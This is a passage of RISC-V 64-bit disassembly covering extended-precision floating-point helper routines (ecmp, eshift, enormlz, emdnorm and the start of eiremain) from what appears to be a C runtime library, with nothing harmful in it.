   13628:	ed39                	bnez	a0,13686 <ecmp+0x7c>
   1362a:	01245783          	lhu	a5,18(s0)
   1362e:	fff7c793          	not	a5,a5
   13632:	03179713          	slli	a4,a5,0x31
   13636:	c721                	beqz	a4,1367e <ecmp+0x74>
   13638:	858a                	mv	a1,sp
   1363a:	8526                	mv	a0,s1
   1363c:	f19ff0ef          	jal	ra,13554 <emovi>
   13640:	100c                	addi	a1,sp,32
   13642:	8522                	mv	a0,s0
   13644:	f11ff0ef          	jal	ra,13554 <emovi>
   13648:	00015583          	lhu	a1,0(sp)
   1364c:	02015783          	lhu	a5,32(sp)
   13650:	02b78d63          	beq	a5,a1,1368a <ecmp+0x80>
   13654:	00210793          	addi	a5,sp,2
   13658:	02210713          	addi	a4,sp,34
   1365c:	0830                	addi	a2,sp,24
   1365e:	0007d683          	lhu	a3,0(a5)
   13662:	0789                	addi	a5,a5,2
   13664:	e2ad                	bnez	a3,136c6 <ecmp+0xbc>
   13666:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   1366a:	0709                	addi	a4,a4,2
   1366c:	eea9                	bnez	a3,136c6 <ecmp+0xbc>
   1366e:	fec798e3          	bne	a5,a2,1365e <ecmp+0x54>
   13672:	4501                	li	a0,0
   13674:	60e6                	ld	ra,88(sp)
   13676:	6446                	ld	s0,80(sp)
   13678:	64a6                	ld	s1,72(sp)
   1367a:	6125                	addi	sp,sp,96
   1367c:	8082                	ret
   1367e:	8522                	mv	a0,s0
   13680:	e63ff0ef          	jal	ra,134e2 <eisnan.part.0>
   13684:	d955                	beqz	a0,13638 <ecmp+0x2e>
   13686:	5579                	li	a0,-2
   13688:	b7f5                	j	13674 <ecmp+0x6a>
   1368a:	4505                	li	a0,1
   1368c:	e1a9                	bnez	a1,136ce <ecmp+0xc4>
   1368e:	00215603          	lhu	a2,2(sp)
   13692:	02215683          	lhu	a3,34(sp)
   13696:	00210713          	addi	a4,sp,2
   1369a:	02210793          	addi	a5,sp,34
   1369e:	182c                	addi	a1,sp,56
   136a0:	0789                	addi	a5,a5,2
   136a2:	0709                	addi	a4,a4,2
   136a4:	00d61c63          	bne	a2,a3,136bc <ecmp+0xb2>
   136a8:	fcb785e3          	beq	a5,a1,13672 <ecmp+0x68>
   136ac:	00075603          	lhu	a2,0(a4)
   136b0:	0007d683          	lhu	a3,0(a5)
   136b4:	0709                	addi	a4,a4,2
   136b6:	0789                	addi	a5,a5,2
   136b8:	fed608e3          	beq	a2,a3,136a8 <ecmp+0x9e>
   136bc:	fac6ece3          	bltu	a3,a2,13674 <ecmp+0x6a>
   136c0:	40a0053b          	negw	a0,a0
   136c4:	bf45                	j	13674 <ecmp+0x6a>
   136c6:	4505                	li	a0,1
   136c8:	d5d5                	beqz	a1,13674 <ecmp+0x6a>
   136ca:	557d                	li	a0,-1
   136cc:	b765                	j	13674 <ecmp+0x6a>
   136ce:	557d                	li	a0,-1
   136d0:	bf7d                	j	1368e <ecmp+0x84>

00000000000136d2 <eisinf.part.0>:
   136d2:	1141                	addi	sp,sp,-16
   136d4:	e406                	sd	ra,8(sp)
   136d6:	e0dff0ef          	jal	ra,134e2 <eisnan.part.0>
   136da:	60a2                	ld	ra,8(sp)
   136dc:	00153513          	seqz	a0,a0
   136e0:	0141                	addi	sp,sp,16
   136e2:	8082                	ret

00000000000136e4 <eshift.part.0>:
   136e4:	7179                	addi	sp,sp,-48
   136e6:	f022                	sd	s0,32(sp)
   136e8:	ec26                	sd	s1,24(sp)
   136ea:	f406                	sd	ra,40(sp)
   136ec:	e84a                	sd	s2,16(sp)
   136ee:	e44e                	sd	s3,8(sp)
   136f0:	84ae                	mv	s1,a1
   136f2:	842a                	mv	s0,a0
   136f4:	0605cb63          	bltz	a1,1376a <eshift.part.0+0x86>
   136f8:	47bd                	li	a5,15
   136fa:	862e                	mv	a2,a1
   136fc:	0511                	addi	a0,a0,4
   136fe:	01840693          	addi	a3,s0,24
   13702:	45bd                	li	a1,15
   13704:	0297d063          	bge	a5,s1,13724 <eshift.part.0+0x40>
   13708:	87aa                	mv	a5,a0
   1370a:	0027d703          	lhu	a4,2(a5)
   1370e:	0789                	addi	a5,a5,2
   13710:	fee79f23          	sh	a4,-2(a5)
   13714:	fed79be3          	bne	a5,a3,1370a <eshift.part.0+0x26>
   13718:	00041c23          	sh	zero,24(s0)
   1371c:	3641                	addiw	a2,a2,-16
   1371e:	fec5c5e3          	blt	a1,a2,13708 <eshift.part.0+0x24>
   13722:	88bd                	andi	s1,s1,15
   13724:	479d                	li	a5,7
   13726:	0297d463          	bge	a5,s1,1374e <eshift.part.0+0x6a>
   1372a:	01840713          	addi	a4,s0,24
   1372e:	00240593          	addi	a1,s0,2
   13732:	4781                	li	a5,0
   13734:	00075683          	lhu	a3,0(a4)
   13738:	1779                	addi	a4,a4,-2
   1373a:	00869613          	slli	a2,a3,0x8
   1373e:	8fd1                	or	a5,a5,a2
   13740:	00f71123          	sh	a5,2(a4)
   13744:	0086d793          	srli	a5,a3,0x8
   13748:	feb716e3          	bne	a4,a1,13734 <eshift.part.0+0x50>
   1374c:	34e1                	addiw	s1,s1,-8
   1374e:	c491                	beqz	s1,1375a <eshift.part.0+0x76>
   13750:	34fd                	addiw	s1,s1,-1
   13752:	8522                	mv	a0,s0
   13754:	cc1ff0ef          	jal	ra,13414 <eshup1>
   13758:	fce5                	bnez	s1,13750 <eshift.part.0+0x6c>
   1375a:	4501                	li	a0,0
   1375c:	70a2                	ld	ra,40(sp)
   1375e:	7402                	ld	s0,32(sp)
   13760:	64e2                	ld	s1,24(sp)
   13762:	6942                	ld	s2,16(sp)
   13764:	69a2                	ld	s3,8(sp)
   13766:	6145                	addi	sp,sp,48
   13768:	8082                	ret
   1376a:	57c5                	li	a5,-15
   1376c:	40b0093b          	negw	s2,a1
   13770:	0ef5d463          	bge	a1,a5,13858 <eshift.part.0+0x174>
   13774:	01850593          	addi	a1,a0,24
   13778:	4981                	li	s3,0
   1377a:	00450693          	addi	a3,a0,4
   1377e:	463d                	li	a2,15
   13780:	01845703          	lhu	a4,24(s0)
   13784:	87ae                	mv	a5,a1
   13786:	00e9e9b3          	or	s3,s3,a4
   1378a:	ffe7d703          	lhu	a4,-2(a5)
   1378e:	17f9                	addi	a5,a5,-2
   13790:	00e79123          	sh	a4,2(a5)
   13794:	fed79be3          	bne	a5,a3,1378a <eshift.part.0+0xa6>
   13798:	00041223          	sh	zero,4(s0)
   1379c:	3941                	addiw	s2,s2,-16
   1379e:	ff2641e3          	blt	a2,s2,13780 <eshift.part.0+0x9c>
   137a2:	57c1                	li	a5,-16
   137a4:	5745                	li	a4,-15
   137a6:	9f85                	subw	a5,a5,s1
   137a8:	4901                	li	s2,0
   137aa:	08e4c063          	blt	s1,a4,1382a <eshift.part.0+0x146>
   137ae:	00f9093b          	addw	s2,s2,a5
   137b2:	479d                	li	a5,7
   137b4:	0327df63          	bge	a5,s2,137f2 <eshift.part.0+0x10e>
   137b8:	0109999b          	slliw	s3,s3,0x10
   137bc:	4109d99b          	sraiw	s3,s3,0x10
   137c0:	01844783          	lbu	a5,24(s0)
   137c4:	01a40593          	addi	a1,s0,26
   137c8:	00f9e9b3          	or	s3,s3,a5
   137cc:	19c2                	slli	s3,s3,0x30
   137ce:	0309d993          	srli	s3,s3,0x30
   137d2:	4781                	li	a5,0
   137d4:	0006d603          	lhu	a2,0(a3)
   137d8:	0689                	addi	a3,a3,2
   137da:	0086571b          	srliw	a4,a2,0x8
   137de:	8f5d                	or	a4,a4,a5
   137e0:	0086179b          	slliw	a5,a2,0x8
   137e4:	17c2                	slli	a5,a5,0x30
   137e6:	fee69f23          	sh	a4,-2(a3)
   137ea:	93c1                	srli	a5,a5,0x30
   137ec:	feb694e3          	bne	a3,a1,137d4 <eshift.part.0+0xf0>
   137f0:	3961                	addiw	s2,s2,-8
   137f2:	04090b63          	beqz	s2,13848 <eshift.part.0+0x164>
   137f6:	01845783          	lhu	a5,24(s0)
   137fa:	397d                	addiw	s2,s2,-1
   137fc:	8522                	mv	a0,s0
   137fe:	8b85                	andi	a5,a5,1
   13800:	0137e9b3          	or	s3,a5,s3
   13804:	bc5ff0ef          	jal	ra,133c8 <eshdn1>
   13808:	fe0917e3          	bnez	s2,137f6 <eshift.part.0+0x112>
   1380c:	0109979b          	slliw	a5,s3,0x10
   13810:	4107d79b          	sraiw	a5,a5,0x10
   13814:	e78d                	bnez	a5,1383e <eshift.part.0+0x15a>
   13816:	03099513          	slli	a0,s3,0x30
   1381a:	9141                	srli	a0,a0,0x30
   1381c:	70a2                	ld	ra,40(sp)
   1381e:	7402                	ld	s0,32(sp)
   13820:	64e2                	ld	s1,24(sp)
   13822:	6942                	ld	s2,16(sp)
   13824:	69a2                	ld	s3,8(sp)
   13826:	6145                	addi	sp,sp,48
   13828:	8082                	ret
   1382a:	ff07f913          	andi	s2,a5,-16
   1382e:	4120093b          	negw	s2,s2
   13832:	00f9093b          	addw	s2,s2,a5
   13836:	479d                	li	a5,7
   13838:	fb27dde3          	bge	a5,s2,137f2 <eshift.part.0+0x10e>
   1383c:	bfb5                	j	137b8 <eshift.part.0+0xd4>
   1383e:	4985                	li	s3,1
   13840:	03099513          	slli	a0,s3,0x30
   13844:	9141                	srli	a0,a0,0x30
   13846:	bfd9                	j	1381c <eshift.part.0+0x138>
   13848:	854e                	mv	a0,s3
   1384a:	00099563          	bnez	s3,13854 <eshift.part.0+0x170>
   1384e:	1542                	slli	a0,a0,0x30
   13850:	9141                	srli	a0,a0,0x30
   13852:	b729                	j	1375c <eshift.part.0+0x78>
   13854:	4505                	li	a0,1
   13856:	bfe5                	j	1384e <eshift.part.0+0x16a>
   13858:	57e5                	li	a5,-7
   1385a:	4981                	li	s3,0
   1385c:	f8f5dde3          	bge	a1,a5,137f6 <eshift.part.0+0x112>
   13860:	00440693          	addi	a3,s0,4
   13864:	bfb1                	j	137c0 <eshift.part.0+0xdc>

0000000000013866 <enormlz>:
   13866:	00455783          	lhu	a5,4(a0)
   1386a:	1101                	addi	sp,sp,-32
   1386c:	e426                	sd	s1,8(sp)
   1386e:	ec06                	sd	ra,24(sp)
   13870:	e822                	sd	s0,16(sp)
   13872:	e04a                	sd	s2,0(sp)
   13874:	84aa                	mv	s1,a0
   13876:	ebc5                	bnez	a5,13926 <enormlz+0xc0>
   13878:	00655703          	lhu	a4,6(a0)
   1387c:	4401                	li	s0,0
   1387e:	0107179b          	slliw	a5,a4,0x10
   13882:	4107d79b          	sraiw	a5,a5,0x10
   13886:	02079693          	slli	a3,a5,0x20
   1388a:	0806c763          	bltz	a3,13918 <enormlz+0xb2>
   1388e:	01a50693          	addi	a3,a0,26
   13892:	0a000613          	li	a2,160
   13896:	e31d                	bnez	a4,138bc <enormlz+0x56>
   13898:	00648793          	addi	a5,s1,6
   1389c:	a019                	j	138a2 <enormlz+0x3c>
   1389e:	0007d703          	lhu	a4,0(a5)
   138a2:	0789                	addi	a5,a5,2
   138a4:	fee79e23          	sh	a4,-4(a5)
   138a8:	fef69be3          	bne	a3,a5,1389e <enormlz+0x38>
   138ac:	00049c23          	sh	zero,24(s1)
   138b0:	2441                	addiw	s0,s0,16
   138b2:	06c40363          	beq	s0,a2,13918 <enormlz+0xb2>
   138b6:	0064d703          	lhu	a4,6(s1)
   138ba:	df79                	beqz	a4,13898 <enormlz+0x32>
   138bc:	f0077793          	andi	a5,a4,-256
   138c0:	eb8d                	bnez	a5,138f2 <enormlz+0x8c>
   138c2:	01848513          	addi	a0,s1,24
   138c6:	00248593          	addi	a1,s1,2
   138ca:	4781                	li	a5,0
   138cc:	872a                	mv	a4,a0
   138ce:	00075683          	lhu	a3,0(a4)
   138d2:	1779                	addi	a4,a4,-2
   138d4:	00869613          	slli	a2,a3,0x8
   138d8:	8fd1                	or	a5,a5,a2
   138da:	00f71123          	sh	a5,2(a4)
   138de:	0086d793          	srli	a5,a3,0x8
   138e2:	fee596e3          	bne	a1,a4,138ce <enormlz+0x68>
   138e6:	0064d703          	lhu	a4,6(s1)
   138ea:	2421                	addiw	s0,s0,8
   138ec:	f0077793          	andi	a5,a4,-256
   138f0:	dfe9                	beqz	a5,138ca <enormlz+0x64>
   138f2:	0a000913          	li	s2,160
   138f6:	a801                	j	13906 <enormlz+0xa0>
   138f8:	2405                	addiw	s0,s0,1
   138fa:	b1bff0ef          	jal	ra,13414 <eshup1>
   138fe:	00894d63          	blt	s2,s0,13918 <enormlz+0xb2>
   13902:	0064d703          	lhu	a4,6(s1)
   13906:	0107171b          	slliw	a4,a4,0x10
   1390a:	4107571b          	sraiw	a4,a4,0x10
   1390e:	02071793          	slli	a5,a4,0x20
   13912:	8526                	mv	a0,s1
   13914:	fe07d2e3          	bgez	a5,138f8 <enormlz+0x92>
   13918:	60e2                	ld	ra,24(sp)
   1391a:	8522                	mv	a0,s0
   1391c:	6442                	ld	s0,16(sp)
   1391e:	64a2                	ld	s1,8(sp)
   13920:	6902                	ld	s2,0(sp)
   13922:	6105                	addi	sp,sp,32
   13924:	8082                	ret
   13926:	f007f713          	andi	a4,a5,-256
   1392a:	4401                	li	s0,0
   1392c:	e705                	bnez	a4,13954 <enormlz+0xee>
   1392e:	f6f00913          	li	s2,-145
   13932:	a801                	j	13942 <enormlz+0xdc>
   13934:	347d                	addiw	s0,s0,-1
   13936:	a93ff0ef          	jal	ra,133c8 <eshdn1>
   1393a:	fd240fe3          	beq	s0,s2,13918 <enormlz+0xb2>
   1393e:	0044d783          	lhu	a5,4(s1)
   13942:	8526                	mv	a0,s1
   13944:	fbe5                	bnez	a5,13934 <enormlz+0xce>
   13946:	60e2                	ld	ra,24(sp)
   13948:	8522                	mv	a0,s0
   1394a:	6442                	ld	s0,16(sp)
   1394c:	64a2                	ld	s1,8(sp)
   1394e:	6902                	ld	s2,0(sp)
   13950:	6105                	addi	sp,sp,32
   13952:	8082                	ret
   13954:	00450693          	addi	a3,a0,4
   13958:	01a50593          	addi	a1,a0,26
   1395c:	4701                	li	a4,0
   1395e:	a019                	j	13964 <enormlz+0xfe>
   13960:	0006d783          	lhu	a5,0(a3)
   13964:	0087d61b          	srliw	a2,a5,0x8
   13968:	8f51                	or	a4,a4,a2
   1396a:	0087979b          	slliw	a5,a5,0x8
   1396e:	00e69023          	sh	a4,0(a3)
   13972:	03079713          	slli	a4,a5,0x30
   13976:	0689                	addi	a3,a3,2
   13978:	9341                	srli	a4,a4,0x30
   1397a:	feb693e3          	bne	a3,a1,13960 <enormlz+0xfa>
   1397e:	0044d783          	lhu	a5,4(s1)
   13982:	5461                	li	s0,-8
   13984:	b76d                	j	1392e <enormlz+0xc8>

0000000000013986 <emdnorm>:
   13986:	7139                	addi	sp,sp,-64
   13988:	f822                	sd	s0,48(sp)
   1398a:	f426                	sd	s1,40(sp)
   1398c:	f04a                	sd	s2,32(sp)
   1398e:	ec4e                	sd	s3,24(sp)
   13990:	e852                	sd	s4,16(sp)
   13992:	e456                	sd	s5,8(sp)
   13994:	8936                	mv	s2,a3
   13996:	84be                	mv	s1,a5
   13998:	fc06                	sd	ra,56(sp)
   1399a:	842a                	mv	s0,a0
   1399c:	89ae                	mv	s3,a1
   1399e:	8a32                	mv	s4,a2
   139a0:	8aba                	mv	s5,a4
   139a2:	ec5ff0ef          	jal	ra,13866 <enormlz>
   139a6:	09000793          	li	a5,144
   139aa:	40a90933          	sub	s2,s2,a0
   139ae:	12a7db63          	bge	a5,a0,13ae4 <emdnorm+0x15e>
   139b2:	67a1                	lui	a5,0x8
   139b4:	17f9                	addi	a5,a5,-2
   139b6:	1927dd63          	bge	a5,s2,13b50 <emdnorm+0x1ca>
   139ba:	160a8b63          	beqz	s5,13b30 <emdnorm+0x1aa>
   139be:	40c8                	lw	a0,4(s1)
   139c0:	409c                	lw	a5,0(s1)
   139c2:	04a78e63          	beq	a5,a0,13a1e <emdnorm+0x98>
   139c6:	01a48713          	addi	a4,s1,26
   139ca:	03448793          	addi	a5,s1,52
   139ce:	0709                	addi	a4,a4,2
   139d0:	fe071f23          	sh	zero,-2(a4)
   139d4:	fef71de3          	bne	a4,a5,139ce <emdnorm+0x48>
   139d8:	03800793          	li	a5,56
   139dc:	28f50263          	beq	a0,a5,13c60 <emdnorm+0x2da>
   139e0:	12a7d163          	bge	a5,a0,13b02 <emdnorm+0x17c>
   139e4:	04000793          	li	a5,64
   139e8:	24f50c63          	beq	a0,a5,13c40 <emdnorm+0x2ba>
   139ec:	07100793          	li	a5,113
   139f0:	28f51163          	bne	a0,a5,13c72 <emdnorm+0x2ec>
   139f4:	47a9                	li	a5,10
   139f6:	40008737          	lui	a4,0x40008
   139fa:	177d                	addi	a4,a4,-1
   139fc:	1782                	slli	a5,a5,0x20
   139fe:	07a9                	addi	a5,a5,10
   13a00:	c8d8                	sw	a4,20(s1)
   13a02:	7761                	lui	a4,0xffff8
   13a04:	00e49c23          	sh	a4,24(s1)
   13a08:	e49c                	sd	a5,8(s1)
   13a0a:	6721                	lui	a4,0x8
   13a0c:	47a9                	li	a5,10
   13a0e:	07a1                	addi	a5,a5,8
   13a10:	0786                	slli	a5,a5,0x1
   13a12:	97a6                	add	a5,a5,s1
   13a14:	00e79523          	sh	a4,10(a5) # 800a <register_fini-0x80a6>
   13a18:	c088                	sw	a0,0(s1)
   13a1a:	17205163          	blez	s2,13b7c <emdnorm+0x1f6>
   13a1e:	4494                	lw	a3,8(s1)
   13a20:	0144d603          	lhu	a2,20(s1)
   13a24:	08f00793          	li	a5,143
   13a28:	00169713          	slli	a4,a3,0x1
   13a2c:	00e40833          	add	a6,s0,a4
   13a30:	00085883          	lhu	a7,0(a6) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc00e0>
   13a34:	00c8f5b3          	and	a1,a7,a2
   13a38:	02a7ce63          	blt	a5,a0,13a74 <emdnorm+0xee>
   13a3c:	47ad                	li	a5,11
   13a3e:	02d7cb63          	blt	a5,a3,13a74 <emdnorm+0xee>
   13a42:	9f95                	subw	a5,a5,a3
   13a44:	1782                	slli	a5,a5,0x20
   13a46:	9381                	srli	a5,a5,0x20
   13a48:	97b6                	add	a5,a5,a3
   13a4a:	00179693          	slli	a3,a5,0x1
   13a4e:	0709                	addi	a4,a4,2
   13a50:	00440793          	addi	a5,s0,4
   13a54:	9722                	add	a4,a4,s0
   13a56:	97b6                	add	a5,a5,a3
   13a58:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   13a5c:	c299                	beqz	a3,13a62 <emdnorm+0xdc>
   13a5e:	0015e593          	ori	a1,a1,1
   13a62:	00071023          	sh	zero,0(a4)
   13a66:	0709                	addi	a4,a4,2
   13a68:	fee798e3          	bne	a5,a4,13a58 <emdnorm+0xd2>
   13a6c:	00085883          	lhu	a7,0(a6)
   13a70:	0144d603          	lhu	a2,20(s1)
   13a74:	fff64613          	not	a2,a2
   13a78:	01167633          	and	a2,a2,a7
   13a7c:	00c81023          	sh	a2,0(a6)
   13a80:	0164d783          	lhu	a5,22(s1)
   13a84:	00b7f733          	and	a4,a5,a1
   13a88:	cb05                	beqz	a4,13ab8 <emdnorm+0x132>
   13a8a:	12b78f63          	beq	a5,a1,13bc8 <emdnorm+0x242>
   13a8e:	03248613          	addi	a2,s1,50
   13a92:	01840693          	addi	a3,s0,24
   13a96:	04f1                	addi	s1,s1,28
   13a98:	4701                	li	a4,0
   13a9a:	00065783          	lhu	a5,0(a2)
   13a9e:	0006d583          	lhu	a1,0(a3)
   13aa2:	16f9                	addi	a3,a3,-2
   13aa4:	1679                	addi	a2,a2,-2
   13aa6:	97ae                	add	a5,a5,a1
   13aa8:	97ba                	add	a5,a5,a4
   13aaa:	0107d713          	srli	a4,a5,0x10
   13aae:	00f69123          	sh	a5,2(a3)
   13ab2:	8b05                	andi	a4,a4,1
   13ab4:	fe9613e3          	bne	a2,s1,13a9a <emdnorm+0x114>
   13ab8:	13205663          	blez	s2,13be4 <emdnorm+0x25e>
   13abc:	00445783          	lhu	a5,4(s0)
   13ac0:	e7ed                	bnez	a5,13baa <emdnorm+0x224>
   13ac2:	67a1                	lui	a5,0x8
   13ac4:	00041c23          	sh	zero,24(s0)
   13ac8:	17f9                	addi	a5,a5,-2
   13aca:	0727c563          	blt	a5,s2,13b34 <emdnorm+0x1ae>
   13ace:	01241123          	sh	s2,2(s0)
   13ad2:	70e2                	ld	ra,56(sp)
   13ad4:	7442                	ld	s0,48(sp)
   13ad6:	74a2                	ld	s1,40(sp)
   13ad8:	7902                	ld	s2,32(sp)
   13ada:	69e2                	ld	s3,24(sp)
   13adc:	6a42                	ld	s4,16(sp)
   13ade:	6aa2                	ld	s5,8(sp)
   13ae0:	6121                	addi	sp,sp,64
   13ae2:	8082                	ret
   13ae4:	0a095a63          	bgez	s2,13b98 <emdnorm+0x212>
   13ae8:	f7000793          	li	a5,-144
   13aec:	06f95b63          	bge	s2,a5,13b62 <emdnorm+0x1dc>
   13af0:	00240793          	addi	a5,s0,2
   13af4:	0469                	addi	s0,s0,26
   13af6:	0789                	addi	a5,a5,2
   13af8:	fe079f23          	sh	zero,-2(a5) # 7ffe <register_fini-0x80b2>
   13afc:	fe879de3          	bne	a5,s0,13af6 <emdnorm+0x170>
   13b00:	bfc9                	j	13ad2 <emdnorm+0x14c>
   13b02:	47e1                	li	a5,24
   13b04:	10f50f63          	beq	a0,a5,13c22 <emdnorm+0x29c>
   13b08:	03500793          	li	a5,53
   13b0c:	16f51363          	bne	a0,a5,13c72 <emdnorm+0x2ec>
   13b10:	040006b7          	lui	a3,0x4000
   13b14:	6705                	lui	a4,0x1
   13b16:	7ff68693          	addi	a3,a3,2047 # 40007ff <__BSS_END__+0x3fc88df>
   13b1a:	4799                	li	a5,6
   13b1c:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   13b20:	c8d4                	sw	a3,20(s1)
   13b22:	1782                	slli	a5,a5,0x20
   13b24:	0799                	addi	a5,a5,6
   13b26:	e49c                	sd	a5,8(s1)
   13b28:	00e49c23          	sh	a4,24(s1)
   13b2c:	4799                	li	a5,6
   13b2e:	b5c5                	j	13a0e <emdnorm+0x88>
   13b30:	00041c23          	sh	zero,24(s0)
   13b34:	77e1                	lui	a5,0xffff8
   13b36:	fff7c793          	not	a5,a5
   13b3a:	00f41123          	sh	a5,2(s0)
   13b3e:	00440793          	addi	a5,s0,4
   13b42:	0461                	addi	s0,s0,24
   13b44:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc00e0>
   13b48:	0789                	addi	a5,a5,2
   13b4a:	fef41de3          	bne	s0,a5,13b44 <emdnorm+0x1be>
   13b4e:	b751                	j	13ad2 <emdnorm+0x14c>
   13b50:	00240793          	addi	a5,s0,2
   13b54:	0469                	addi	s0,s0,26
   13b56:	0789                	addi	a5,a5,2
   13b58:	fe079f23          	sh	zero,-2(a5)
   13b5c:	fe879de3          	bne	a5,s0,13b56 <emdnorm+0x1d0>
   13b60:	bf8d                	j	13ad2 <emdnorm+0x14c>
   13b62:	0009059b          	sext.w	a1,s2
   13b66:	8522                	mv	a0,s0
   13b68:	b7dff0ef          	jal	ra,136e4 <eshift.part.0>
   13b6c:	c111                	beqz	a0,13b70 <emdnorm+0x1ea>
   13b6e:	4985                	li	s3,1
   13b70:	0a0a8463          	beqz	s5,13c18 <emdnorm+0x292>
   13b74:	40c8                	lw	a0,4(s1)
   13b76:	409c                	lw	a5,0(s1)
   13b78:	e4a797e3          	bne	a5,a0,139c6 <emdnorm+0x40>
   13b7c:	09000793          	li	a5,144
   13b80:	08f50163          	beq	a0,a5,13c02 <emdnorm+0x27c>
   13b84:	01845783          	lhu	a5,24(s0)
   13b88:	8522                	mv	a0,s0
   13b8a:	8b85                	andi	a5,a5,1
   13b8c:	00f9e9b3          	or	s3,s3,a5
   13b90:	839ff0ef          	jal	ra,133c8 <eshdn1>
   13b94:	40c8                	lw	a0,4(s1)
   13b96:	b561                	j	13a1e <emdnorm+0x98>
   13b98:	f20a85e3          	beqz	s5,13ac2 <emdnorm+0x13c>
   13b9c:	40c8                	lw	a0,4(s1)
   13b9e:	409c                	lw	a5,0(s1)
   13ba0:	e2a793e3          	bne	a5,a0,139c6 <emdnorm+0x40>
   13ba4:	e7204de3          	bgtz	s2,13a1e <emdnorm+0x98>
   13ba8:	bfd1                	j	13b7c <emdnorm+0x1f6>
   13baa:	8522                	mv	a0,s0
   13bac:	81dff0ef          	jal	ra,133c8 <eshdn1>
   13bb0:	67a1                	lui	a5,0x8
   13bb2:	0905                	addi	s2,s2,1
   13bb4:	00041c23          	sh	zero,24(s0)
   13bb8:	17f9                	addi	a5,a5,-2
   13bba:	f727cde3          	blt	a5,s2,13b34 <emdnorm+0x1ae>
   13bbe:	f00958e3          	bgez	s2,13ace <emdnorm+0x148>
   13bc2:	00041123          	sh	zero,2(s0)
   13bc6:	b731                	j	13ad2 <emdnorm+0x14c>
   13bc8:	08099963          	bnez	s3,13c5a <emdnorm+0x2d4>
   13bcc:	44dc                	lw	a5,12(s1)
   13bce:	0184d703          	lhu	a4,24(s1)
   13bd2:	0786                	slli	a5,a5,0x1
   13bd4:	97a2                	add	a5,a5,s0
   13bd6:	0007d783          	lhu	a5,0(a5) # 8000 <register_fini-0x80b0>
   13bda:	8ff9                	and	a5,a5,a4
   13bdc:	ea0799e3          	bnez	a5,13a8e <emdnorm+0x108>
   13be0:	ed204ee3          	bgtz	s2,13abc <emdnorm+0x136>
   13be4:	09000793          	li	a5,144
   13be8:	00f50563          	beq	a0,a5,13bf2 <emdnorm+0x26c>
   13bec:	8522                	mv	a0,s0
   13bee:	827ff0ef          	jal	ra,13414 <eshup1>
   13bf2:	00445783          	lhu	a5,4(s0)
   13bf6:	fbd5                	bnez	a5,13baa <emdnorm+0x224>
   13bf8:	00041c23          	sh	zero,24(s0)
   13bfc:	fc0943e3          	bltz	s2,13bc2 <emdnorm+0x23c>
   13c00:	b5f9                	j	13ace <emdnorm+0x148>
   13c02:	0084a803          	lw	a6,8(s1)
   13c06:	0144d603          	lhu	a2,20(s1)
   13c0a:	0806                	slli	a6,a6,0x1
   13c0c:	9822                	add	a6,a6,s0
   13c0e:	00085883          	lhu	a7,0(a6)
   13c12:	011675b3          	and	a1,a2,a7
   13c16:	bdb9                	j	13a74 <emdnorm+0xee>
   13c18:	00041c23          	sh	zero,24(s0)
   13c1c:	00041123          	sh	zero,2(s0)
   13c20:	bd4d                	j	13ad2 <emdnorm+0x14c>
   13c22:	4791                	li	a5,4
   13c24:	00800737          	lui	a4,0x800
   13c28:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c81df>
   13c2c:	1782                	slli	a5,a5,0x20
   13c2e:	0791                	addi	a5,a5,4
   13c30:	c8d8                	sw	a4,20(s1)
   13c32:	10000713          	li	a4,256
   13c36:	e49c                	sd	a5,8(s1)
   13c38:	00e49c23          	sh	a4,24(s1)
   13c3c:	4791                	li	a5,4
   13c3e:	bbc1                	j	13a0e <emdnorm+0x88>
   13c40:	478d                	li	a5,3
   13c42:	80010737          	lui	a4,0x80010
   13c46:	177d                	addi	a4,a4,-1
   13c48:	1786                	slli	a5,a5,0x21
   13c4a:	079d                	addi	a5,a5,7
   13c4c:	c8d8                	sw	a4,20(s1)
   13c4e:	4705                	li	a4,1
   13c50:	e49c                	sd	a5,8(s1)
   13c52:	00e49c23          	sh	a4,24(s1)
   13c56:	4799                	li	a5,6
   13c58:	bb5d                	j	13a0e <emdnorm+0x88>
   13c5a:	e20a0ae3          	beqz	s4,13a8e <emdnorm+0x108>
   13c5e:	bda9                	j	13ab8 <emdnorm+0x132>
   13c60:	00800737          	lui	a4,0x800
   13c64:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c81df>
   13c68:	c8d8                	sw	a4,20(s1)
   13c6a:	4799                	li	a5,6
   13c6c:	10000713          	li	a4,256
   13c70:	bd4d                	j	13b22 <emdnorm+0x19c>
   13c72:	47ad                	li	a5,11
   13c74:	80010737          	lui	a4,0x80010
   13c78:	177d                	addi	a4,a4,-1
   13c7a:	1782                	slli	a5,a5,0x20
   13c7c:	07b1                	addi	a5,a5,12
   13c7e:	c8d8                	sw	a4,20(s1)
   13c80:	4705                	li	a4,1
   13c82:	e49c                	sd	a5,8(s1)
   13c84:	00e49c23          	sh	a4,24(s1)
   13c88:	47ad                	li	a5,11
   13c8a:	b351                	j	13a0e <emdnorm+0x88>

0000000000013c8c <eiremain>:
   13c8c:	711d                	addi	sp,sp,-96
   13c8e:	e4a6                	sd	s1,72(sp)
   13c90:	fc4e                	sd	s3,56(sp)
   13c92:	84ae                	mv	s1,a1
   13c94:	00255983          	lhu	s3,2(a0)
   13c98:	ec86                	sd	ra,88(sp)
   13c9a:	e8a2                	sd	s0,80(sp)
   13c9c:	e0ca                	sd	s2,64(sp)
   13c9e:	f852                	sd	s4,48(sp)
   13ca0:	8932                	mv	s2,a2
   13ca2:	f456                	sd	s5,40(sp)
   13ca4:	f05a                	sd	s6,32(sp)
   13ca6:	ec5e                	sd	s7,24(sp)
   13ca8:	e862                	sd	s8,16(sp)
   13caa:	e466                	sd	s9,8(sp)
   13cac:	e06a                	sd	s10,0(sp)
   13cae:	8a2a                	mv	s4,a0
